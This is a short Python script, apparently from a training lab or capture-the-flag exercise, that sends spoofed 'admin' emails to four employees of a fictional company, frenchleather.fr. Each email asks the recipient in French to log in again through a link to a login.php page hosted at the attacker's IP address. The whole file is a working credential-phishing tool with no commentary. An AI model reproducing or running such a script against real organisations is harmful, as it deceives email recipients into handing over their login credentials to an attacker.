#!/usr/bin/env python2

import send_mail
from threading import Thread
import socket

def send(host, f, t, s, m):
	send_mail.main(host, f, t, s, m)

if __name__ == "__main__":
	import argparse
	parser = argparse.ArgumentParser(description="Email outburst Python script")
	parser.add_argument("host", help="Hostname or IP Address of target")
	parser.add_argument("-i", "--ip", help="Hostname or IP Address of target")

	args = parser.parse_args()
	host = args.host
	local_ip = args.ip
	local_ip = local_ip[:-2]

	Thread(target=send, args=(host, 'admin@frenchleather.fr', 'marie.curie@frenchleather.fr', 'Veuillez vous reconnecter', "Vueillez vous reconnecter en cliquant sur ce lien svp : http://" + local_ip + "login.php")).start()
	Thread(target=send, args=(host, 'admin@frenchleather.fr', 'louis.pasteur@frenchleather.fr', 'Veuillez vous reconnecter', "Vueillez vous reconnecter en cliquant sur ce lien svp : http://" + local_ip + "login.php")).start()
	Thread(target=send, args=(host, 'admin@frenchleather.fr', 'henri.poincare@frenchleather.fr', 'Veuillez vous reconnecter', "Vueillez vous reconnecter en cliquant sur ce lien svp : http://" + local_ip + "login.php")).start()
	Thread(target=send, args=(host, 'admin@frenchleather.fr', 'pierre.dupont@frenchleather.fr', 'Veuillez vous reconnecter', "Vueillez vous reconnecter en cliquant sur ce lien svp : http://" + local_ip + "login.php")).start()
